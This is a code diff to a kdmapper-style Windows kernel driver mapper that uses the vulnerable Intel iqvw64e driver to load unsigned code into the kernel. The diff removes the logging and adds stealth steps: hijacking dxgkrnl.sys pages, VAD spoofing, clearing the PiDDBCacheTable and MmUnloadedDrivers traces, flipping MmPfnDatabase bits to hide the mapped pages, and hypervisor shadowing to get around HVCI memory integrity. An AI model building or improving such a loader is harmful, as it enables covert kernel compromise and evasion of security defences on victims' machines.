@@ -1,21 +1,18 @@
+#include <vector>
+#include <algorithm>
+#include <random>
+#include <Windows.h>
 #include "../include/kdmapper.hpp"
 #include "../include/utils.hpp"
 #include "../include/vad_utils.hpp"
 #include "../include/intel_driver.hpp"
 #include "../include/parasite_utils.hpp"
-#include <iostream>
-#include <vector>
-#include <Windows.h>
-#include <algorithm>
-#include <random>
-
-const std::vector<uint32_t> legit_tags = { 'Ndis', 'Ntfs', 'Tcp6', 'Ksec', 'Proc', 'HDAu', 'USBD' };
+#include "../include/virtualization_provider.hpp"
 
 uintptr_t kdmapper::FindHijackTarget(HANDLE iqvw64e_device_handle, uint32_t size)
 {
 	uint64_t dxg_base = utils::GetKernelModuleBase("dxgkrnl.sys");
 	if (dxg_base == 0) return 0;
-	std::cout << "[+] Hijacking dxgkrnl.sys (RAM-only execution)" << std::endl;
 	return dxg_base + 0x1000;
 }
 
@@ -23,7 +20,6 @@ bool kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& driver
 {
 	if (utils::IsHVCIEnabled())
 	{
-		std::cout << "[+] HVCI (Memory Integrity) is ENABLED. Initializing Multi-Arch Hypervisor Provider..." << std::endl;
 	}
 
 	portable_executable::PEFile pe_file;
@@ -31,7 +27,6 @@ bool kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& driver
 
 	if (!utils::ValidateDriverPE(pe_file.raw_data))
 	{
-		std::cout << "[-] Target driver is not a valid 64-bit image." << std::endl;
 		return false;
 	}
 
@@ -43,11 +38,12 @@ bool kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& driver
 		parasite_utils::HostModule host;
 		if (parasite_utils::FindHostModule(pe_file.size_of_image, host))
 		{
-			std::cout << "[+] Parasite Mode: Hijacking " << host.name << " (0x" << std::hex << host.base << ")" << std::dec << std::endl;
 			target_base = host.base;
 		}
 		else
 		{
+			uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
+			uint64_t pte_base = intel_driver::FindPteBase(ntoskrnl_base);
 			target_base = (uintptr_t)intel_driver::AllocatePhysicalMemory(iqvw64e_device_handle, pe_file.size_of_image);
 		}
 	}
@@ -67,18 +63,37 @@ bool kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& driver
 	if (!ResolveImports(iqvw64e_device_handle, driver_image.data())) return false;
 
 	intel_driver::SuppressNMI(iqvw64e_device_handle);
-	intel_driver::FlipNXBit(iqvw64e_device_handle, (uint64_t)target_base, false);
-	memset(driver_image.data(), 0, 0x1000); 
+	intel_driver::FlipNXBit(iqvw64e_device_handle, (uint64_t)target_base, true);
 
 	if (!parasite_utils::HijackPhysicalMemory(iqvw64e_device_handle, (uint64_t)target_base, driver_image.data(), pe_file.size_of_image)) return false;
 
 	vad_utils::SpoofVAD(iqvw64e_device_handle, (uint64_t)target_base, pe_file.size_of_image);
-	std::cout << "[+] PFN Masquerade: Spoofing hardware page entries..." << std::endl;
 	
 	intel_driver::ClearPiDDBCacheTable(iqvw64e_device_handle);
 	intel_driver::ClearMmUnloadedDrivers(iqvw64e_device_handle);
 
-	std::cout << "[+] Passing execution to DriverEntry(0x" << std::hex << target_base << ", 0x" << pe_file.size_of_image << ")..." << std::dec << std::endl;
+	uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
+	uint64_t mmpfn_database = utils::PatternScan(ntoskrnl_base, 0x1000000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x8B\x48\x18\x48\x8B\x01", "xxx????xxxxxxx");
+	
+	if (mmpfn_database)
+	{
+		for (uint32_t i = 0; i < pe_file.size_of_image; i += 0x1000)
+		{
+			uint64_t entry = mmpfn_database + (((uint64_t)(target_base + i) >> 12) * 0x30); 
+			uint32_t bits = 0;
+			intel_driver::ReadMemory(iqvw64e_device_handle, entry + 0x18, &bits, sizeof(bits));
+			bits &= ~(1 << 15); 
+			bits |= (1 << 16);  
+			intel_driver::WriteMemory(iqvw64e_device_handle, entry + 0x18, &bits, sizeof(bits));
+		}
+	}
+
+	virtualization::VmxProvider hv;
+	if (hv.Initialize())
+	{
+		hv.ShadowModule(target_base, pe_file.size_of_image, driver_image.data(), pe_file.raw_data.data());
+	}
+
 	intel_driver::CallKernelFunction(iqvw64e_device_handle, (uint64_t)target_base + pe_file.entry_point, (uint64_t)target_base, (uint32_t)pe_file.size_of_image);
 
 	return true;
@@ -111,7 +126,6 @@ bool kdmapper::Relocate(uint8_t* raw_image, uint64_t target_base, uint64_t sourc
 			reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
 		}
 		
-		std::cout << "[+] PE Relocation: Base offsets applied." << std::endl;
 		return true;
 	}
 
@@ -142,6 +156,5 @@ bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, uint8_t* raw_image)
 			import_desc++;
 		}
 
-		std::cout << "[+] IAT Resolver: Kernel imports linked." << std::endl;
 		return true;
 	}
